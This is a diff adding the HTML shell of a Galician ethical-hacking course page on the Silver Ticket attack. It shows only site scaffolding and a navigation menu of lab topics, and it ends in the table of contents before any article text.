@@ -1,0 +1,2738 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../1-GUIA_MESTRA_VULN_HE/">
+      
+      
+        <link rel="next" href="../9-ATAQUE_ESPECIFICO_GOLDEN_TICKET/">
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Silver Ticket - Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#vector-de-ataque-silver-ticket-persistencia-en-servizos" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-header__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Silver Ticket
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../apuntamentos/consideracions/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../doc-vulnyx-pivoting-war-basic/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD3
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-nav__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/consideracions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Consideracións
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tips
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tips
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/proxychains_pivoting_doc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proxychains e SOCKS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    GNU/Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            GNU/Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/restauracion-tty-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TTY non interactiva
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/rlwrap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    rlwrap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/uids-syscalls-wrappers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    UIDs, Syscalls e Wrappers de Persistencia
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/referencias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Referencias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/ataques-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques Kerberos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/desactivar-windows-defender/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Desactivar Windows Defender
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/powershell_bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../apuntamentos/tips/nishang/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nishang
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD3
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../doc-vulnyx-pivoting-war-basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows / Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../doc-vulnyx-pivoting-basic-war/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux / Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulNyx
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            VulNyx
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_1" id="__nav_3_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../indice_vulnyx_low_linux_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller-vulnyx-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas VulNyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_2" id="__nav_3_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../indice_vulnyx_low_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Low
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../indice_vulnyx_easy_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Easy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../indice_vulnyx_medium_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Medium
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller-windows-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas Vulnyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Vuln Lab AD-DC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Vuln Lab AD-DC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    README
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-GUIA_MESTRA_VULN_HE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía mestra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1_3" id="__nav_3_3_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_3_1_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Silver Ticket
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Silver Ticket
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#descricion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descrición
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Descrición">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vantaxes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vantaxes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#desvantaxes" class="md-nav__link">
